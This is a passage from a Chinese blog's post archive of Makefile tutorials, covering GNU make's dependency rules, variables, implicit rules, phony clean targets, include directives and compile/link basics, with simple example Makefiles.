就可以了。</p><p>在这个makefile中，目标文件（target）包含：执行文件edit和中间目标文件（ <code>*.o</code> ），依赖文件（prerequisites）就是冒号后面的那些 <code>.c</code> 文件和 <code>.h</code> 文件。每一个 <code>.o</code> 文件都有一组依赖文件，而这些 <code>.o</code> 文件又是执行文件 <code>edit</code> 的依赖文件。依赖关系的实质就是说明了目标文件是由哪些文件生成的，换言之，目标文件是哪些文件更新的。</p><p>在定义好依赖关系后，后续的那一行定义了如何生成目标文件的操作系统命令，一定要以一个 <code>Tab</code> 键作为开头。记住，make并不管命令是怎么工作的，他只管执行所定义的命令。make会比较targets文件和prerequisites文件的修改日期，如果prerequisites文件的日期要比targets文件的日期要新，或者target不存在的话，那么，make就会执行后续定义的命令。</p><p>这里要说明一点的是， <code>clean</code> 不是一个文件，它只不过是一个动作名字，有点像c语言中的label一样，其冒号后什么也没有，那么，make就不会自动去找它的依赖性，也就不会自动执行其后所定义的命令。要执行其后的命令，就要在make命令后明显得指出这个label的名字。这样的方法非常有用，我们可以在一个makefile中定义不用的编译或是和编译无关的命令，比如程序的打包，程序的备份，等等。</p><h2 id="make是如何工作的">make是如何工作的<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#make">¶</a></h2><p>在默认的方式下，也就是我们只输入 <code>make</code> 命令。那么，</p><ol><li>make会在当前目录下找名字叫“Makefile”或“makefile”的文件。</li><li>如果找到，它会找文件中的第一个目标文件（target），在上面的例子中，他会找到“edit”这个文件，并把这个文件作为最终的目标文件。</li><li>如果edit文件不存在，或是edit所依赖的后面的 <code>.o</code> 文件的文件修改时间要比 <code>edit</code> 这个文件新，那么，他就会执行后面所定义的命令来生成 <code>edit</code> 这个文件。</li><li>如果 <code>edit</code> 所依赖的 <code>.o</code> 文件也不存在，那么make会在当前文件中找目标为 <code>.o</code> 文件的依赖性，如果找到则再根据那一个规则生成 <code>.o</code> 文件。（这有点像一个堆栈的过程）</li><li>当然，你的C文件和H文件是存在的啦，于是make会生成 <code>.o</code> 文件，然后再用 <code>.o</code> 文件生成make的终极任务，也就是执行文件 <code>edit</code> 了。</li></ol><p>这就是整个make的依赖性，make会一层又一层地去找文件的依赖关系，直到最终编译出第一个目标文件。在找寻的过程中，如果出现错误，比如最后被依赖的文件找不到，那么make就会直接退出，并报错，而对于所定义的命令的错误，或是编译不成功，make根本不理。make只管文件的依赖性，即，如果在我找了依赖关系之后，冒号后面的文件还是不在，那么对不起，我就不工作啦。</p><p>通过上述分析，我们知道，像clean这种，没有被第一个目标文件直接或间接关联，那么它后面所定义的命令将不会被自动执行，不过，我们可以显示要make执行。即命令—— <code>make clean</code> ，以此来清除所有的目标文件，以便重编译。</p><p>于是在我们编程中，如果这个工程已被编译过了，当我们修改了其中一个源文件，比如 <code>file.c</code> ，那么根据我们的依赖性，我们的目标 <code>file.o</code> 会被重编译（也就是在这个依性关系后面所定义的命令），于是 <code>file.o</code> 的文件也是最新的啦，于是 <code>file.o</code> 的文件修改时间要比 <code>edit</code> 要新，所以 <code>edit</code> 也会被重新链接了（详见 <code>edit</code> 目标文件后定义的命令）。</p><p>而如果我们改变了 <code>command.h</code> ，那么， <code>kdb.o</code> 、 <code>command.o</code> 和 <code>files.o</code> 都会被重编译，并且， <code>edit</code> 会被重链接。</p><h2 id="makefile中使用变量">makefile中使用变量<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id3">¶</a></h2><p>在上面的例子中，先让我们看看edit的规则：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit : main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br><span class="line">    cc -o edit main.o kbd.o command.o display.o \</span><br><span class="line">        insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><p>我们可以看到 <code>.o</code> 文件的字符串被重复了两次，如果我们的工程需要加入一个新的 <code>.o</code> 文件，那么我们需要在两个地方加（应该是三个地方，还有一个地方在clean中）。当然，我们的makefile并不复杂，所以在两个地方加也不累，但如果makefile变得复杂，那么我们就有可能会忘掉一个需要加入的地方，而导致编译失败。所以，为了makefile的易维护，在makefile中我们可以使用变量。makefile的变量也就是一个字符串，理解成C语言中的宏可能会更好。</p><p>比如，我们声明一个变量，叫 <code>objects</code> ， <code>OBJECTS</code> ， <code>objs</code> ， <code>OBJS</code> ， <code>obj</code> 或是 <code>OBJ</code> ，反正不管什么啦，只要能够表示obj文件就行了。我们在makefile一开始就这样定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">     insert.o search.o files.o utils.o</span><br></pre></td></tr></table></figure><p>于是，我们就可以很方便地在我们的makefile中以 <code>$(objects)</code> 的方式来使用这个变量了，于是我们的改良版makefile就变成下面这个样子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">    insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">edit : $(objects)</span><br><span class="line">    cc -o edit $(objects)</span><br><span class="line">main.o : main.c defs.h</span><br><span class="line">    cc -c main.c</span><br><span class="line">kbd.o : kbd.c defs.h command.h</span><br><span class="line">    cc -c kbd.c</span><br><span class="line">command.o : command.c defs.h command.h</span><br><span class="line">    cc -c command.c</span><br><span class="line">display.o : display.c defs.h buffer.h</span><br><span class="line">    cc -c display.c</span><br><span class="line">insert.o : insert.c defs.h buffer.h</span><br><span class="line">    cc -c insert.c</span><br><span class="line">search.o : search.c defs.h buffer.h</span><br><span class="line">    cc -c search.c</span><br><span class="line">files.o : files.c defs.h buffer.h command.h</span><br><span class="line">    cc -c files.c</span><br><span class="line">utils.o : utils.c defs.h</span><br><span class="line">    cc -c utils.c</span><br><span class="line">clean :</span><br><span class="line">    rm edit $(objects)</span><br></pre></td></tr></table></figure><p>于是如果有新的 <code>.o</code> 文件加入，我们只需简单地修改一下 <code>objects</code> 变量就可以了。</p><p>关于变量更多的话题，我会在后续给你一一道来。</p><h2 id="让make自动推导">让make自动推导<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id4">¶</a></h2><p>GNU的make很强大，它可以自动推导文件以及文件依赖关系后面的命令，于是我们就没必要去在每一个 <code>.o</code> 文件后都写上类似的命令，因为，我们的make会自动识别，并自己推导命令。</p><p>只要make看到一个 <code>.o</code> 文件，它就会自动的把 <code>.c</code> 文件加在依赖关系中，如果make找到一个 <code>whatever.o</code> ，那么 <code>whatever.c</code> 就会是 <code>whatever.o</code> 的依赖文件。并且 <code>cc -c whatever.c</code> 也会被推导出来，于是，我们的makefile再也不用写得这么复杂。我们的新makefile又出炉了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">    insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">edit : $(objects)</span><br><span class="line">    cc -o edit $(objects)</span><br><span class="line"></span><br><span class="line">main.o : defs.h</span><br><span class="line">kbd.o : defs.h command.h</span><br><span class="line">command.o : defs.h command.h</span><br><span class="line">display.o : defs.h buffer.h</span><br><span class="line">insert.o : defs.h buffer.h</span><br><span class="line">search.o : defs.h buffer.h</span><br><span class="line">files.o : defs.h buffer.h command.h</span><br><span class="line">utils.o : defs.h</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm edit $(objects)</span><br></pre></td></tr></table></figure><p>这种方法，也就是make的“隐晦规则”。上面文件内容中， <code>.PHONY</code> 表示 <code>clean</code> 是个伪目标文件。</p><p>关于更为详细的“隐晦规则”和“伪目标文件”，我会在后续给你一一道来。</p><h2 id="另类风格的makefiles">另类风格的makefiles<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#makefiles">¶</a></h2><p>既然我们的make可以自动推导命令，那么我看到那堆 <code>.o</code> 和 <code>.h</code> 的依赖就有点不爽，那么多的重复的 <code>.h</code> ，能不能把其收拢起来，好吧，没有问题，这个对于make来说很容易，谁叫它提供了自动推导命令和文件的功能呢？来看看最新风格的makefile吧。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">objects = main.o kbd.o command.o display.o \</span><br><span class="line">    insert.o search.o files.o utils.o</span><br><span class="line"></span><br><span class="line">edit : $(objects)</span><br><span class="line">    cc -o edit $(objects)</span><br><span class="line"></span><br><span class="line">$(objects) : defs.h</span><br><span class="line">kbd.o command.o files.o : command.h</span><br><span class="line">display.o insert.o search.o files.o : buffer.h</span><br><span class="line"></span><br><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    rm edit $(objects)</span><br></pre></td></tr></table></figure><p>这种风格，让我们的makefile变得很简单，但我们的文件依赖关系就显得有点凌乱了。鱼和熊掌不可兼得。还看你的喜好了。我是不喜欢这种风格的，一是文件的依赖关系看不清楚，二是如果文件一多，要加入几个新的 <code>.o</code> 文件，那就理不清楚了。</p><h2 id="清空目标文件的规则">清空目标文件的规则<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id5">¶</a></h2><p>每个Makefile中都应该写一个清空目标文件（ <code>.o</code> 和执行文件）的规则，这不仅便于重编译，也很利于保持文件的清洁。这是一个“修养”（呵呵，还记得我的《编程修养》吗）。一般的风格都是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clean:</span><br><span class="line">    rm edit $(objects)</span><br></pre></td></tr></table></figure><p>更为稳健的做法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.PHONY : clean</span><br><span class="line">clean :</span><br><span class="line">    -rm edit $(objects)</span><br></pre></td></tr></table></figure><p>前面说过， <code>.PHONY</code> 表示 <code>clean</code> 是一个“伪目标”。而在 <code>rm</code> 命令前面加了一个小减号的意思就是，也许某些文件出现问题，但不要管，继续做后面的事。当然， <code>clean</code> 的规则不要放在文件的开头，不然，这就会变成make的默认目标，相信谁也不愿意这样。不成文的规矩是——“clean从来都是放在文件的最后”。</p><p>上面就是一个makefile的概貌，也是makefile的基础，下面还有很多makefile的相关细节，准备好了吗？准备好了就来。</p><h2 id="makefile里有什么">Makefile里有什么？<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id6">¶</a></h2><p>Makefile里主要包含了五个东西：显式规则、隐晦规则、变量定义、文件指示和注释。</p><ol><li>显式规则。显式规则说明了如何生成一个或多个目标文件。这是由Makefile的书写者明显指出要生成的文件、文件的依赖文件和生成的命令。</li><li>隐晦规则。由于我们的make有自动推导的功能，所以隐晦的规则可以让我们比较简略地书写 Makefile，这是由make所支持的。</li><li>变量的定义。在Makefile中我们要定义一系列的变量，变量一般都是字符串，这个有点像你C语言中的宏，当Makefile被执行时，其中的变量都会被扩展到相应的引用位置上。</li><li>文件指示。其包括了三个部分，一个是在一个Makefile中引用另一个Makefile，就像C语言中的include一样；另一个是指根据某些情况指定Makefile中的有效部分，就像C语言中的预编译#if一样；还有就是定义一个多行的命令。有关这一部分的内容，我会在后续的部分中讲述。</li><li>注释。Makefile中只有行注释，和UNIX的Shell脚本一样，其注释是用 <code>#</code> 字符，这个就像C/C++中的 <code>//</code> 一样。如果你要在你的Makefile中使用 <code>#</code> 字符，可以用反斜杠进行转义，如： <code>\#</code> 。</li></ol><p>最后，还值得一提的是，在Makefile中的命令，必须要以 <code>Tab</code> 键开始。</p><h2 id="makefile的文件名">Makefile的文件名<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id7">¶</a></h2><p>默认的情况下，make命令会在当前目录下按顺序找寻文件名为“GNUmakefile”、“makefile”、“Makefile”的文件，找到了解释这个文件。在这三个文件名中，最好使用“Makefile”这个文件名，因为，这个文件名第一个字符为大写，这样有一种显目的感觉。最好不要用“GNUmakefile”，这个文件是GNU的make识别的。有另外一些make只对全小写的“makefile”文件名敏感，但是基本上来说，大多数的make都支持“makefile”和“Makefile”这两种默认文件名。</p><p>当然，你可以使用别的文件名来书写Makefile，比如：“Make.Linux”，“Make.Solaris”，“Make.AIX”等，如果要指定特定的Makefile，你可以使用make的 <code>-f</code> 和 <code>--file</code> 参数，如： <code>make -f Make.Linux</code> 或 <code>make --file Make.AIX</code> 。</p><h2 id="引用其它的makefile">引用其它的Makefile<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id8">¶</a></h2><p>在Makefile使用 <code>include</code> 关键字可以把别的Makefile包含进来，这很像C语言的 <code>#include</code> ，被包含的文件会原模原样的放在当前文件的包含位置。 <code>include</code> 的语法是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include &lt;filename&gt;</span><br></pre></td></tr></table></figure><p><code>filename</code> 可以是当前操作系统Shell的文件模式（可以包含路径和通配符）。</p><p>在 <code>include</code> 前面可以有一些空字符，但是绝不能是 <code>Tab</code> 键开始。 <code>include</code> 和 <code>&lt;filename&gt;</code> 可以用一个或多个空格隔开。举个例子，你有这样几个Makefile： <code>a.mk</code> 、 <code>b.mk</code> 、 <code>c.mk</code> ，还有一个文件叫 <code>foo.make</code> ，以及一个变量 <code>$(bar)</code> ，其包含了 <code>e.mk</code> 和 <code>f.mk</code> ，那么，下面的语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include foo.make *.mk $(bar)</span><br></pre></td></tr></table></figure><p>等价于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include foo.make a.mk b.mk c.mk e.mk f.mk</span><br></pre></td></tr></table></figure><p>make命令开始时，会找寻 <code>include</code> 所指出的其它Makefile，并把其内容安置在当前的位置。就好像C/C++的 <code>#include</code> 指令一样。如果文件都没有指定绝对路径或是相对路径的话，make会在当前目录下首先寻找，如果当前目录下没有找到，那么，make还会在下面的几个目录下找：</p><ol><li>如果make执行时，有 <code>-I</code> 或 <code>--include-dir</code> 参数，那么make就会在这个参数所指定的目录下去寻找。</li><li>如果目录 <code>&lt;prefix&gt;/include</code> （一般是： <code>/usr/local/bin</code> 或 <code>/usr/include</code> ）存在的话，make也会去找。</li></ol><p>如果有文件没有找到的话，make会生成一条警告信息，但不会马上出现致命错误。它会继续载入其它的文件，一旦完成makefile的读取，make会再重试这些没有找到，或是不能读取的文件，如果还是不行，make才会出现一条致命信息。如果你想让make不理那些无法读取的文件，而继续执行，你可以在include前加一个减号“-”。如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-include &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>其表示，无论include过程中出现什么错误，都不要报错继续执行。和其它版本make兼容的相关命令是sinclude，其作用和这一个是一样的。</p><h2 id="环境变量makefiles">环境变量MAKEFILES<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id9">¶</a></h2><p>如果你的当前环境中定义了环境变量 <code>MAKEFILES</code> ，那么，make会把这个变量中的值做一个类似于 <code>include</code> 的动作。这个变量中的值是其它的Makefile，用空格分隔。只是，它和 <code>include</code> 不同的是，从这个环境变量中引入的Makefile的“目标”不会起作用，如果环境变量中定义的文件发现错误，make也会不理。</p><p>但是在这里我还是建议不要使用这个环境变量，因为只要这个变量一被定义，那么当你使用make时，所有的Makefile都会受到它的影响，这绝不是你想看到的。在这里提这个事，只是为了告诉大家，也许有时候你的Makefile出现了怪事，那么你可以看看当前环境中有没有定义这个变量。</p><h2 id="make的工作方式">make的工作方式<a href="https://seisman.github.io/how-to-write-makefile/introduction.html#id10">¶</a></h2><p>GNU的make工作时的执行步骤如下：（想来其它的make也是类似）</p><ol><li>读入所有的Makefile。</li><li>读入被include的其它Makefile。</li><li>初始化文件中的变量。</li><li>推导隐晦规则，并分析所有规则。</li><li>为所有的目标文件创建依赖关系链。</li><li>根据依赖关系，决定哪些目标要重新生成。</li><li>执行生成命令。</li></ol><p>1-5步为第一个阶段，6-7为第二个阶段。第一个阶段中，如果定义的变量被使用了，那么，make会把其展开在使用的位置。但make并不会完全马上展开，make使用的是拖延战术，如果变量出现在依赖关系的规则中，那么仅当这条依赖被决定要使用了，变量才会在其内部展开。</p><p>当然，这个工作方式你不一定要清楚，但是知道这个方式你也会对make更为熟悉。有了这个基础，后续部分也就容易看懂了。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Makefile概述</title>
      <link href="/2024/04/26/Security/binary/Makefile/0.%E6%A6%82%E8%BF%B0/"/>
      <url>/2024/04/26/Security/binary/Makefile/0.%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="makefile概述">Makefile概述<a href="https://seisman.github.io/how-to-write-makefile/overview.html#id1">¶</a></h1><p>什么是makefile？或许很多Windows的程序员都不知道这个东西，因为那些Windows的集成开发环境（integrated development environment，IDE）都为你做了这个工作，但我觉得要作一个好的和专业的程序员，makefile还是要懂。这就好像现在有这么多的HTML编辑器，但如果你想成为一个专业人士，你还是要了解HTML的标签的含义。特别在Unix下的软件编译，你就不能不自己写makefile了，会不会写makefile，从一个侧面说明了一个人是否具备完成大型工程的能力。</p><p>因为，makefile关系到了整个工程的编译规则。一个工程中的源文件不计其数，并且按类型、功能、模块分别放在若干个目录中，makefile定义了一系列的规则来指定，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作，因为makefile就像一个Shell脚本一样，其中也可以执行操作系统的命令。</p><p>makefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了软件开发的效率。 make是一个命令工具，是一个解释makefile中指令的命令工具，一般来说，大多数的IDE都有这个命令，比如：Delphi的make，Visual C++的nmake，Linux下GNU的make。可见，makefile都成为了一种在工程方面的编译方法。</p><p>现在讲述如何写makefile的文章比较少，这是我想写这篇文章的原因。当然，不同产商的make各不相同，也有不同的语法，但其本质都是在 “文件依赖性”上做文章，这里，我仅对GNU的make进行讲述，我的环境是RedHat Linux 8.0，make的版本是3.80。毕竟，这个make是应用最为广泛的，也是用得最多的。而且其还是最遵循于IEEE 1003.2-1992标准的（POSIX.2）。</p><p>在这篇文档中，将以C/C<ins>的源码作为基础，所以必然涉及一些关于C/C</ins>的编译的知识。关于这方面的内容，还请各位查看相关的编译器的文档。这里所默认的编译器是UNIX下的GCC和CC。</p><h2 id="关于程序的编译和链接">关于程序的编译和链接<a href="https://seisman.github.io/how-to-write-makefile/overview.html#id2">¶</a></h2><p>在此，我想多说关于程序编译的一些规范和方法。一般来说，无论是C还是C++，首先要把源文件编译成中间代码文件，在Windows下也就是 <code>.obj</code> 文件，UNIX下是 <code>.o</code> 文件，即Object File，这个动作叫做编译（compile）。然后再把大量的Object File合成执行文件，这个动作叫作链接（link）。</p><p>编译时，编译器需要的是语法的正确，函数与变量的声明的正确。对于后者，通常是你需要告诉编译器头文件的所在位置（头文件中应该只是声明，而定义应该放在C/C++文件中），只要所有的语法正确，编译器就可以编译出中间目标文件。一般来说，每个源文件都应该对应于一个中间目标文件（ <code>.o</code> 文件或 <code>.obj</code> 文件）。</p><p>链接时，主要是链接函数和全局变量。所以，我们可以使用这些中间目标文件（ <code>.o</code> 文件或 <code>.obj</code> 文件）来链接我们的应用程序。链接器并不管函数所在的源文件，只管函数的中间目标文件（Object File），在大多数时候，由于源文件太多，编译生成的中间目标文件太多，而在链接时需要明显地指出中间目标文件名，这对于编译很不方便。所以，我们要给中间目标文件打个包，在Windows下这种包叫“库文件”（Library File），也就是 <code>.lib</code> 文件，在UNIX下，是Archive File，也就是 <code>.a</code> 文件。</p><p>总结一下，源文件首先会生成中间目标文件，再由中间目标文件生成执行文件。在编译时，编译器只检测程序语法和函数、变量是否被声明。如果函数未被声明，编译器会给出一个警告，但可以生成Object File。而在链接程序时，链接器会在所有的Object File中找寻函数的实现，如果找不到，那到就会报链接错误码（Linker Error），在VC下，这种错误一般是： <code>Link 2001错误</code> ，意思说是说，链接器未能找到函数的实现。你需要指定函数的Object File。</p><p>好，言归正传，gnu的make有许多的内容，闲言少叙。</p><p><a href="https://seisman.github.io/how-to-write-makefile/index.html"> Previous</a><a href="https://seisman.github.io/how-to-write-makefile/introduction.html">Next </a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Makefile </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>写个简单的Makefile做开场白</title>
      <link href="/2024/04/26/Security/binary/Makefile/Makefile/"/>
      <url>/2024/04/26/Security/binary/Makefile/Makefile/</url>
      
        <content type="html"><![CDATA[<h2 id="写个简单的makefile做开场白">写个简单的Makefile做开场白</h2><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261000041.jpeg" alt="img" style="zoom:67%;" /><p>需要说明一下，文档目录结构是用户目录HOME下有src incl bin lib。</p><p>src：源码</p><p>incl：头文件</p><p>bin：执行码</p><p>lib：静态/动态库</p><p>这是大家最常见的Linux编程目录结构，以下代码编译都是依据这个结构。</p><h2 id="简单的makefile代码">简单的Makefile代码</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">hello:hello.c</span></span><br><span class="line">gcc -I$&#123;HOME&#125;/incl -c hello.c</span><br><span class="line">gcc -o hello hello.o</span><br><span class="line">rm -f hello.o</span><br><span class="line">mv hello $&#123;HOME&#125;/bin</span><br></pre></td></tr></table></figure><p>没接触过Makefile的同学肯定能看出，这段代码不就是把编译、链接、删除、移动写成shell脚本执行吗？没错的，把第一行去掉，其他代码粘贴到shell脚本里同样可以编译成功，一点问题都没有。</p><h2 id="makefile结构说明">Makefile结构说明</h2><p>Makefile里主要包含了五个东西：变量定义、显式规则、隐晦规则、文件指示和注释。</p><p>1、变量的定义。在Makefile中我们要定义一系列的变量，变量一般都是字符串，这个有点像C语言中的宏，当Makefile被执行时，其中的变量都会被扩展到相应的引用位置上。</p><p>2、显式规则。显式规则说明了，如何生成一个或多个的目标文件。这是由Makefile的书写者明显指出，要生成的文件，文件的依赖文件，生成的命令。 刚才写的疑似shell脚本的Makefile全部都是显示规则。</p><p>3、隐晦规则。由于我们的make有自动推导的功能，所以隐晦的规则可以让我们比较粗糙地简略地书写Makefile，这是由make所支持的。</p><p>4、文件指示。其包括了三个部分，一个是在一个Makefile中引用另一个Makefile，就像C语言中的include一样。</p><p>5、注释。Makefile中只有行注释，和UNIX的Shell脚本一样，其注释是用“#”字符，这个就像C/C++中的“//”一样。如果你要在你的Makefile中使用“#”字符。</p><h2 id="复杂一些的makefile">复杂一些的Makefile</h2><p>根据上面的结构说明，我们对Makefile一层一层的改写，首先是隐晦规则，告诉大家其中一种用法：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">.SUFFIXES: .cpp .c</span></span><br><span class="line"><span class="section">.cpp.o:</span></span><br><span class="line">g++ $&#123;INCL&#125; -c <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">.c.o:</span></span><br><span class="line">gcc $&#123;INCL&#125; -c <span class="variable">$&lt;</span></span><br></pre></td></tr></table></figure><p>这个隐晦规则其实就是告诉大家，后缀为cpp的文件怎么编译成.o，后缀为c的文件怎么编译成.o。</p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261000548.webp" alt="img" style="zoom:67%;" /><p>到目前为止的Makefile已经有模有样了，Makefile代码双手奉上。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#隐含规则</span></span><br><span class="line">INCL=-I$&#123;HOME&#125;/incl</span><br><span class="line"></span><br><span class="line"><span class="section">.SUFFIXES: .cpp .c</span></span><br><span class="line"><span class="section">.cpp.o:</span></span><br><span class="line">g++ $&#123;INCL&#125; -c <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">.c.o:</span></span><br><span class="line">gcc $&#123;INCL&#125; -c <span class="variable">$&lt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#C++编译</span></span><br><span class="line"><span class="section">hellocpp:hellocpp.o</span></span><br><span class="line">echo <span class="string">&quot;开始编译&quot;</span></span><br><span class="line">g++ -o hellocpp hellocpp.o</span><br><span class="line">rm -f hellocpp.o</span><br><span class="line">mv hellocpp $&#123;HOME&#125;/bin</span><br><span class="line">echo <span class="string">&quot;编译结束&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#C编译</span></span><br><span class="line"><span class="section">hello:hello.o</span></span><br><span class="line">echo <span class="string">&quot;开始编译&quot;</span></span><br><span class="line">gcc -o hello hello.o</span><br><span class="line">rm -f hello.o</span><br><span class="line">mv hello $&#123;HOME&#125;/bin</span><br><span class="line">echo <span class="string">&quot;编译结束&quot;</span></span><br></pre></td></tr></table></figure><p>细心的同学会发现刚才有个“$&lt;”，如果看的有些蒙圈，那一定要了解预定义变量，下面这些是常用的预定义变量。</p><ul><li><p>$*    不包含扩展名的目标文件名称。</p></li><li><p>$+    所有的依赖文件，以空格分开，并以出现的先后为序，可能包含重复的依赖文件。</p></li><li><p>$&lt;    第一个依赖文件的名称。</p></li><li><p>$?    所有的依赖文件，以空格分开，这些依赖文件的修改日期比目标的创建日期晚。</p></li><li><p>$@    目标的完整名称。</p></li><li><p>$^    所有的依赖文件，以空格分开，不包含重复的依赖文件。</p></li><li><p>$%    如果目标是归档成员，则该变量表示目标的归档成员名称。</p></li></ul><p>注意前方高能，Makefile的最终展现</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261000487.webp" alt="img"></p><p>Makefile详细图解</p><p>实际编译结果</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404261000361.webp" alt="img"></p><p>Makefile编译结果</p><p>看着挺乱的吧，稍微改一改，双手奉上Makefile代码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#最后形成的Makefile</span><br><span class="line">INCL=-I$&#123;HOME&#125;/incl</span><br><span class="line">BIN=$(HOME)/bin</span><br><span class="line">OBJ1=hellocpp.o</span><br><span class="line">OBJ2=hello.o</span><br><span class="line"></span><br><span class="line">.SUFFIXES: .cpp .c</span><br><span class="line">.cpp.o:</span><br><span class="line">g++ $&#123;INCL&#125; -c $&lt;</span><br><span class="line"></span><br><span class="line">.c.o:</span><br><span class="line">gcc $&#123;INCL&#125; -c $&lt;</span><br><span class="line"></span><br><span class="line">all: hellocpp hello</span><br><span class="line"></span><br><span class="line">#C++编译</span><br><span 